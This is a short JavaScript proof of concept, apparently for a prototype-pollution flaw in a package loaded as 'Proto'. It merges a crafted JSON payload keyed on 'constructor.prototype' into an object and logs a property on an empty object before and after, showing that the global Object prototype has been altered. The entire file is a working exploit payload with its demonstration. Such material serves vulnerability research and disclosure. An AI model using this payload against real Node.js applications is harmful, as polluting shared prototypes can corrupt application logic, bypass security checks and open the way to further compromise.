var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const proto = require('Proto');
let payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
proto.merge(obj, JSON.parse(payload));
console.log({}.polluted);